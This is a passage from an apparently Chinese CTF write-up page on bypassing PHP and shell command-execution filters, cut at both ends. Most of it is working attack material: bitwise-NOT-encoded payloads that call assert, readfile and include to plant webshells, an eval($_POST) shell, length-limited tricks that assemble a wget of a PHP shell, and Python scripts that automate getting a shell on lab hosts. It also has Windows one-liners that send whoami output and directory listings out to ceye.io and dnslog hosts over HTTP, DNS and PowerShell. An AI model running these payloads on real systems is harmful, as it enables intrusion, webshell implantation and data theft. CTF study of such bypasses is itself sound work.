class="number">8</span>D%<span class="number">96</span>%<span class="number">91</span>%<span class="number">8</span>B%A0%<span class="number">8</span>D    <span class="comment">#print_r</span></span><br><span class="line">%<span class="number">8</span>C%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">91</span>%<span class="number">9</span>B%<span class="number">96</span>%<span class="number">8</span>D    <span class="comment">#scan_dir</span></span><br><span class="line">%D0%<span class="number">8</span>B%<span class="number">92</span>%<span class="number">8</span>F             <span class="comment">#/tmp</span></span><br><span class="line">?code=(~%<span class="number">8</span>F%<span class="number">8</span>D%<span class="number">96</span>%<span class="number">91</span>%<span class="number">8</span>B%A0%<span class="number">8</span>D)((~%<span class="number">8</span>C%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">91</span>%<span class="number">9</span>B%<span class="number">96</span>%<span class="number">8</span>D)(~%D0%<span class="number">8</span>B%<span class="number">92</span>%<span class="number">8</span>F));  print_r(scan_dir(/tmp));   没有引号也行</span><br><span class="line"></span><br><span class="line">hack.php</span><br><span class="line">%D0%<span class="number">8</span>B%<span class="number">92</span>%<span class="number">8</span>F%D0%<span class="number">97</span>%<span class="number">9</span>E%<span class="number">9</span>C%<span class="number">94</span>%D1%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F   /tmp/hack.php</span><br><span class="line">?code=(~%<span class="number">8</span>D%<span class="number">9</span>A%<span class="number">9</span>E%<span class="number">9</span>B%<span class="number">99</span>%<span class="number">96</span>%<span class="number">93</span>%<span class="number">9</span>A)((~%D0%<span class="number">8</span>B%<span class="number">92</span>%<span class="number">8</span>F%D0%<span class="number">97</span>%<span class="number">9</span>E%<span class="number">9</span>C%<span class="number">94</span>%D1%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F));  readfile(/tmp/hack.php);</span><br><span class="line">?code=(~%<span class="number">8</span>D%<span class="number">9</span>A%<span class="number">9</span>E%<span class="number">9</span>B%<span class="number">99</span>%<span class="number">96</span>%<span class="number">93</span>%<span class="number">9</span>A)((~%D0%<span class="number">8</span>B%<span class="number">92</span>%<span class="number">8</span>F%D0%CB%<span class="number">8</span>C%D1%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F));    readfile(/tmp/<span class="number">4</span>s.php);</span><br></pre></td></tr></table></figure>

<p>aasert</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">由于之前的禁用函数没有包含aasert，所以尝试使用assert函数写shell</span><br><span class="line">assert($_POST[<span class="string">'a'</span>]);</span><br><span class="line">%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B    <span class="comment"># assert</span></span><br><span class="line">%DB%A0%AF%B0%AC%AB    <span class="comment"># $_POST</span></span><br><span class="line">%<span class="number">9</span>E   <span class="comment"># a</span></span><br><span class="line">%DB%A0%AF%B0%AC%AB%A4%DD%<span class="number">9</span>E%DD%A2  <span class="comment">#$_POST["a"]</span></span><br><span class="line">(~%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B)((~%DB%A0%AF%B0%AC%AB)[(~%<span class="number">9</span>E)]);  <span class="comment">//全拆开编码            assert($_POST["a"]);</span></span><br><span class="line">(~%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B)((~%DB%A0%AF%B0%AC%AB%A4%DD%<span class="number">9</span>E%DD%A2));  <span class="comment">//后面一起编码        assert($_POST["a"]);</span></span><br><span class="line"></span><br><span class="line">%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B    <span class="comment">#assert</span></span><br><span class="line">%<span class="number">96</span>%<span class="number">91</span>%<span class="number">9</span>C%<span class="number">93</span>%<span class="number">8</span>A%<span class="number">9</span>B%<span class="number">9</span>A%D7%DD%D0%<span class="number">8</span>B%<span class="number">92</span>%<span class="number">8</span>F%D0%<span class="number">97</span>%<span class="number">9</span>E%<span class="number">9</span>C%<span class="number">94</span>%D1%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%DD%D6%C4        <span class="keyword">include</span>(<span class="string">"/tmp/hack.php"</span>);</span><br><span class="line">访问网址：http:<span class="comment">//114.116.44.23:40001/?code=(~%9E%8C%8C%9A%8D%8B)((~%96%91%9C%93%8A%9B%9A%D7%DD%D0%8B%92%8F%D0%97%9E%9C%94%D1%8F%97%8F%DD%D6%C4));     assert(include("/tmp/hack.php"););</span></span><br><span class="line">post数据：test=phpinfo();</span><br><span class="line"></span><br><span class="line">code=(~%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B)((~%<span class="number">96</span>%<span class="number">91</span>%<span class="number">9</span>C%<span class="number">93</span>%<span class="number">8</span>A%<span class="number">9</span>B%<span class="number">9</span>A%D7%D8%D0%<span class="number">8</span>B%<span class="number">92</span>%<span class="number">8</span>F%D0%<span class="number">9</span>D%<span class="number">86</span>%<span class="number">8</span>F%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%A0%<span class="number">9</span>B%<span class="number">96</span>%<span class="number">8</span>C%<span class="number">9</span>E%<span class="number">9</span>D%<span class="number">93</span>%<span class="number">9</span>A%<span class="number">99</span>%<span class="number">8</span>A%<span class="number">91</span>%<span class="number">9</span>C%<span class="number">5</span>E%<span class="number">5</span>C%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%D8%D6%DF));</span><br><span class="line">cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/<span class="keyword">var</span>/www/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B)((~%<span class="number">91</span>%<span class="number">9</span>A%<span class="number">87</span>%<span class="number">8</span>B)((~%<span class="number">98</span>%<span class="number">9</span>A%<span class="number">8</span>B%<span class="number">9</span>E%<span class="number">93</span>%<span class="number">93</span>%<span class="number">97</span>%<span class="number">9</span>A%<span class="number">9</span>E%<span class="number">9</span>B%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>C)()));</span><br><span class="line"><span class="comment">//("assert")(("next")(("getallheaders")()));</span></span><br><span class="line">assert()</span><br><span class="line">这个 exp 需要 php 版本刚好为 <span class="number">7.0</span> 通过 phpinfo 就可以知道版本，大于小于这个 exp 都会失效，具体原因大家应该知道为什么</span><br><span class="line">    </span><br><span class="line">然后我们就可以在 U-A 头里面随意执行命令，蚁剑连上，准备拿 flag</span><br><span class="line"><span class="keyword">eval</span>($_POST[cmd]);</span><br></pre></td></tr></table></figure>

<h1 id="无字母的webshell"><a href="#无字母的webshell" class="headerlink" title="无字母的webshell"></a>无字母的webshell</h1><p>过waf </p>
<p>免杀</p>
<p>![img](6 命令执行/clip_image002-1596107636016.jpg)</p>
<p>Post 4=fsdsdf</p>
<p>![img](6 命令执行/clip_image003.png)</p>
<p>Post c=fsdsdf</p>
<p>![img](6 命令执行/clip_image004.png) ![img](6 命令执行/clip_image005.png)</p>
<p>通过键值对互换  assert</p>
<h2 id="七个字的命令执行-突破长度限制"><a href="#七个字的命令执行-突破长度限制" class="headerlink" title="七个字的命令执行  突破长度限制"></a>七个字的命令执行  突破长度限制</h2><p>长度限制可以用<strong>文件构造</strong>的方式来绕过。</p>
<blockquote>
<p>linux下可以用 1&gt;a创建文件名为a的空文件<br>ls -t&gt;test则会将目录按时间排序后写进test文件中<br>sh命令可以从一个文件中读取命令来执行</p>
</blockquote>
<p>利用这些特性，即可以成功绕过长度限制来执行命令。</p>
<p>这题是p总在小密圈发表的一篇文章，当时没有做出来，这题是利用重命名文件绕过的，所以可以这样进行调用，因为限制了命令的长度，所以无法直接构造，只能通过文件构造</p>
<p>这里先介绍一下小技巧，linux下创建文件的命令可以用1&gt;1创建文件名为1的空文件</p>
<p><img src="https://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt="浅谈CTF中命令执行与绕过的小技巧"></p>
<p>进一步fuzz发现a&gt;1居然也可以，虽然会报错，但是还是可以创建空文件。</p>
<p><img src="https://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt="浅谈CTF中命令执行与绕过的小技巧"></p>
<p>ls&gt;1可以直接把把ls的内容导入一个文件中,但是会默认追加\n。有了这个基础，我们再来看这道题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(strlen($_GET[1])&lt;8)&#123;</span><br><span class="line">     echo shell_exec($_GET[1]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>简单的代码，可以利用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1&gt;wget\</span><br><span class="line">1&gt;域名.\</span><br><span class="line">1&gt;com\</span><br><span class="line">1&gt;-O\</span><br><span class="line">1&gt;she\</span><br><span class="line">1&gt;ll.p\</span><br><span class="line">1&gt;p</span><br><span class="line">ls -t&gt;a</span><br><span class="line">sh a</span><br><span class="line"></span><br><span class="line">-O：指定文件名</span><br></pre></td></tr></table></figure>

<p>这里注意.不能作为文件名的开头，因为linux下.是隐藏文件的开头，ls列不出来</p>
<p>然而这里还有个问题，就是ls下的文件名是按照字母顺序排序的，所以需要基于时间排序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -t&gt;a</span><br></pre></td></tr></table></figure>

<p>payload1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&gt;wget</span><br></pre></td></tr></table></figure>

<p>payload2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&gt;wget</span><br></pre></td></tr></table></figure>

<p>payload3:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;wget</span><br></pre></td></tr></table></figure>

<p>将会创建一个名字为wget的空文件。payload1会报错，payload2不会报错。.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">#-*- coding: utf-8 -*- </span><br><span class="line"></span><br><span class="line">import requests </span><br><span class="line">def GetShell():</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;192.168.56.129&#x2F;shell.php?1&#x3D;&quot;</span><br><span class="line">    fileNames &#x3D; [&quot;1.php&quot;,&quot;-O\ \\&quot;,&quot;cn\ \\&quot;,&quot;\ a.\\&quot;,&quot;wget\\&quot;] </span><br><span class="line">    # linux创建中间有空格的文件名，需要转义，所以有请求&quot;cn\ \\&quot;</span><br><span class="line">    # 可以修改hosts文件，让a.cn指向一个自己的服务器。</span><br><span class="line">    # 在a.cn 的根目录下创建index.html ，内容是一个php shell </span><br><span class="line"></span><br><span class="line">    for fileName in fileNames:</span><br><span class="line">        createFileUrl &#x3D; url+&quot;&gt;&quot;+fileName</span><br><span class="line">        print createFileUrl </span><br><span class="line">        requests.get(createFileUrl)</span><br><span class="line"></span><br><span class="line">    getShUrl &#x3D; url + &quot;ls -t&gt;1&quot;</span><br><span class="line">    print getShUrl</span><br><span class="line">    requests.get(getShUrl)</span><br><span class="line">    getShellUrl &#x3D; url + &quot;sh 1&quot;</span><br><span class="line">    print getShellUrl</span><br><span class="line">    requests.get(getShellUrl)</span><br><span class="line"></span><br><span class="line">    shellUrl &#x3D; &quot;http:&#x2F;&#x2F;192.168.56.129&#x2F;1.php&quot;</span><br><span class="line">    response &#x3D; requests.get(shellUrl)</span><br><span class="line">    if response.status_code &#x3D;&#x3D; 200:</span><br><span class="line">        print &quot;[*] Get shell !&quot;</span><br><span class="line">    else :</span><br><span class="line">        print &quot;[*] fail!&quot;</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    GetShell()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;192.168.61.157&#x2F;rce.php?1&#x3D;&#123;0&#125;&quot;</span><br><span class="line">print(&quot;[+]start attack!!!&quot;)</span><br><span class="line">with open(&quot;payload.txt&quot;,&quot;r&quot;) as f:</span><br><span class="line">	for i in f:</span><br><span class="line">		print(&quot;[*]&quot; + url.format(i.strip()))</span><br><span class="line">		requests.get(url.format(i.strip()))</span><br><span class="line"> </span><br><span class="line">#检查是否攻击成功</span><br><span class="line">test &#x3D; requests.get(&quot;http:&#x2F;&#x2F;192.168.61.157&#x2F;1.php&quot;)</span><br><span class="line">if test.status_code &#x3D;&#x3D; requests.codes.ok:</span><br><span class="line">	print(&quot;[*]Attack success!!!&quot;)</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">&gt;hp</span><br><span class="line">&gt;1.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;7\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">ls -t&gt;0</span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure>

<h1 id="绕过ip中的句点网络地址转化为数字地址"><a href="#绕过ip中的句点网络地址转化为数字地址" class="headerlink" title="绕过ip中的句点网络地址转化为数字地址"></a>绕过ip中的句点网络地址转化为数字地址</h1><p>网络地址有另外一种表示形式，就是数字地址比如127.0.0.1可以转化为2130706433</p>
<p>可以直接访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;2130706433</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0x7F000001</span><br></pre></td></tr></table></figure>

<p>这样就可以绕过.的ip过滤，这里给个转化网址：<a href="http://www.msxindl.com/tools/ip/ip_num.asp" target="_blank" rel="noopener">http://www.msxindl.com/tools/ip/ip_num.asp</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//php转化脚本</span></span><br><span class="line"><span class="meta">&lt;?php</span> printf(<span class="string">"%u"</span>, ip2long(<span class="string">"192.168.1.106"</span>));</span><br></pre></td></tr></table></figure>

<p>如果使用 10 进制 IP，只能对使用 nginx 的服务器成功，对 apache 的服务器是会失败的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ip ``=` `<span class="string">'127.0.0.1'</span></span><br><span class="line"><span class="comment"># 十六进制</span></span><br><span class="line"><span class="keyword">print</span>` `<span class="string">'0x'</span>` `+` `<span class="string">''</span>.join([``str``(``hex``(``int``(i))[``<span class="number">2</span>``:].zfill(``<span class="number">2</span>``))</span><br><span class="line">          ``<span class="keyword">for</span>` `i ``in` `ip.split(``<span class="string">'.'</span>``)])</span><br><span class="line"><span class="comment"># 长整数</span></span><br><span class="line"><span class="keyword">print</span>` `int``(<span class="string">''</span>.join([``str``(``hex``(``int``(i))[``<span class="number">2</span>``:].zfill(``<span class="number">2</span>``))</span><br><span class="line">          ``<span class="keyword">for</span>` `i ``in` `ip.split(``<span class="string">'.'</span>``)]), ``<span class="number">16</span>``)</span><br><span class="line"><span class="comment"># 八进制</span></span><br><span class="line"><span class="keyword">print</span>` `<span class="string">'0'</span>` `+` `oct``(``int``(<span class="string">''</span>.join([``str``(``hex``(``int``(i))[``<span class="number">2</span>``:].zfill(``<span class="number">2</span>``))</span><br><span class="line">          ``<span class="keyword">for</span>` `i ``in` `ip.split(``<span class="string">'.'</span>``)]), ``<span class="number">16</span>``))</span><br></pre></td></tr></table></figure>







<h1 id="window绕过"><a href="#window绕过" class="headerlink" title="window绕过"></a>window绕过</h1><blockquote>
<p><strong>：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</strong></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（实用性不是很广，也就<span class="built_in">type</span>这个命令可以用）</span><br><span class="line"><span class="built_in">type</span>.\flag.txt</span><br><span class="line"><span class="built_in">type</span>,flag.txt</span><br><span class="line"><span class="built_in">echo</span>,123456</span><br></pre></td></tr></table></figure>

<p>windows:<br> windows下很头疼，用起来并没有linux那么方便好用，比如curl、wget等等。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http请求：</span><br><span class="line"><span class="keyword">for</span> /F %x in (<span class="string">'whoami'</span>) <span class="keyword">do</span> start http:<span class="comment">//xxx.ceye.io/%x</span></span><br><span class="line"></span><br><span class="line">dns请求：</span><br><span class="line">获取计算机名：<span class="keyword">for</span> /F <span class="string">"delims=\" %i in ('whoami') do ping -n 1 %i.xxx.dnslog.info</span></span><br><span class="line"><span class="string">获取用户名：for /F "</span>delims=\ tokens=<span class="number">2</span><span class="string">" %i in ('whoami') do ping -n 1 %i.xxx.dnslog.info</span></span><br></pre></td></tr></table></figure>

<p>powershell这么厉害，为啥不用它来base64一下数据。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /F %x in (<span class="string">'whoami'</span>) <span class="keyword">do</span> powershell $a=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(<span class="string">'%x'</span>));$b=<span class="keyword">New</span>-Object System.Net.WebClient;$b.DownloadString(<span class="string">'http://xxx.ceye.io/'</span>+$a);</span><br></pre></td></tr></table></figure>

<p>这样就也能获取到一个base64编码到命令结果啦～算是弥补一个小小的坑。</p>
<p>ps:这个是用powershell2.0写的,其他版本未测试。</p>
<p>但是如果没有powershell想要获取更多数据的话，还是比较麻烦的。</p>
<p>比如获取d:\所有文件,遇上空格也是会被截断。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /F %x in (<span class="string">'dir /b D:\') do start http://xxx.ceye.io/%x</span></span><br></pre></td></tr></table></figure>

<ul>
<li>宽字节注入</li>
</ul>
<p>php5.2.5及之前可以通过输入多字节来绕过。现在几乎见不到了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">escapeshellcmd(<span class="string">"echo "</span>.chr(<span class="number">0xc0</span>).<span class="string">";id"</span>);</span><br></pre></td></tr></table></figure>

<p>之后该语句会变成</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> 繺;id</span><br></pre></td></tr></table></figure>

<p>从而实现 id 命令的注入。</p>
<h1 id="绕过escapeshellcmd"><a href="#绕过escapeshellcmd" class="headerlink" title="绕过escapeshellcmd"></a>绕过escapeshellcmd</h1><p>本地测试环境：php 5.4.45 + win</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $command = <span class="string">'dir '</span>.$_POST[<span class="string">'dir'</span>];</span><br><span class="line">    $escaped_command = escapeshellcmd($command);</span><br><span class="line">    var_dump($escaped_command);</span><br><span class="line">    file_put_contents(<span class="string">'out.bat'</span>,$escaped_command);</span><br><span class="line">    system(<span class="string">'out.bat'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">else</span> </span></span><br><span class="line"><span class="number">283</span> 			<span class="comment">/* % is Windows specific for enviromental variables, ^%PATH% will  </span></span><br><span class="line"><span class="comment">284 				output PATH while ^%PATH^% will not. escapeshellcmd will escape all % and !. </span></span><br><span class="line"><span class="comment">285 			*/</span> </span><br><span class="line"><span class="number">286</span> 			<span class="keyword">case</span> <span class="string">'%'</span>: </span><br><span class="line"><span class="number">287</span> 			<span class="keyword">case</span> <span class="string">'!'</span>: </span><br><span class="line"><span class="number">288</span> 			<span class="keyword">case</span> <span class="string">'"'</span>: </span><br><span class="line"><span class="number">289</span> 			<span class="keyword">case</span> <span class="string">'\''</span>: </span><br><span class="line"><span class="number">290</span> <span class="meta">#<span class="meta-keyword">endif</span> </span></span><br><span class="line"><span class="number">291</span> 			<span class="keyword">case</span> <span class="string">'#'</span>: <span class="comment">/* This is character-set independent */</span> </span><br><span class="line"><span class="number">292</span> 			<span class="keyword">case</span> <span class="string">'&amp;'</span>: </span><br><span class="line"><span class="number">293</span> 			<span class="keyword">case</span> <span class="string">';'</span>: </span><br><span class="line"><span class="number">294</span> 			<span class="keyword">case</span> <span class="string">'`'</span>: </span><br><span class="line"><span class="number">295</span> 			<span class="keyword">case</span> <span class="string">'|'</span>: </span><br><span class="line"><span class="number">296</span> 			<span class="keyword">case</span> <span class="string">'*'</span>: </span><br><span class="line"><span class="number">297</span> 			<span class="keyword">case</span> <span class="string">'?'</span>: </span><br><span class="line"><span class="number">298</span> 			<span class="keyword">case</span> <span class="string">'~'</span>: </span><br><span class="line"><span class="number">299</span> 			<span class="keyword">case</span> <span class="string">'&lt;'</span>: </span><br><span class="line"><span class="number">300</span> 			<span class="keyword">case</span> <span class="string">'&gt;'</span>: </span><br><span class="line"><span class="number">301</span> 			<span class="keyword">case</span> <span class="string">'^'</span>: </span><br><span class="line"><span class="number">302</span> 			<span class="keyword">case</span> <span class="string">'('</span>: </span><br><span class="line"><span class="number">303</span> 			<span class="keyword">case</span> <span class="string">')'</span>: </span><br><span class="line"><span class="number">304</span> 			<span class="keyword">case</span> <span class="string">'['</span>: </span><br><span class="line"><span class="number">305</span> 			<span class="keyword">case</span> <span class="string">']'</span>: </span><br><span class="line"><span class="number">306</span> 			<span class="keyword">case</span> <span class="string">'&#123;'</span>: </span><br><span class="line"><span class="number">307</span> 			<span class="keyword">case</span> <span class="string">'&#125;'</span>: </span><br><span class="line"><span class="number">308</span> 			<span class="keyword">case</span> <span class="string">'$'</span>: </span><br><span class="line"><span class="number">309</span> 			<span class="keyword">case</span> <span class="string">'\\'</span>: </span><br><span class="line"><span class="number">310</span> 			<span class="keyword">case</span> <span class="string">'\x0A'</span>: <span class="comment">/* excluding these two */</span> </span><br><span class="line"><span class="number">311</span> 			<span class="keyword">case</span> <span class="string">'\xFF'</span>: </span><br><span class="line"><span class="number">312</span> <span class="meta">#<span class="meta-keyword">ifdef</span> PHP_WIN32 </span></span><br><span class="line"><span class="number">313</span> 				cmd[y++] = <span class="string">'^'</span>; </span><br><span class="line"><span class="number">314</span> <span class="meta">#<span class="meta-keyword">else</span> </span></span><br><span class="line"><span class="number">315</span> 				cmd[y++] = <span class="string">'\\'</span>;</span><br></pre></td></tr></table></figure>

<p>这些都会用<code>^</code>来取消其意义。也就是没办法用&amp; | 来执行其他命令，只能列目录。</p>
<p>有这样的一个tip：执行<code>.bat</code>文件的时候，利用<code>%1a</code>，可以绕过过滤执行命令。</p>
<h2 id="题Hitcon2015-babyfirst"><a href="#题Hitcon2015-babyfirst" class="headerlink" title="题Hitcon2015_babyfirst"></a>题Hitcon2015_babyfirst</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    $dir = <span class="string">'sandbox/'</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !file_exists($dir) )</span><br><span class="line">        mkdir($dir,<span class="number">0777</span>,<span class="keyword">true</span>);</span><br><span class="line">    chdir($dir);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">for</span> ( $i=<span class="number">0</span>; $i&lt;count($args); $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span> ( !preg_match(<span class="string">'/^\w+$/'</span>, $args[$i]) )</span><br><span class="line">       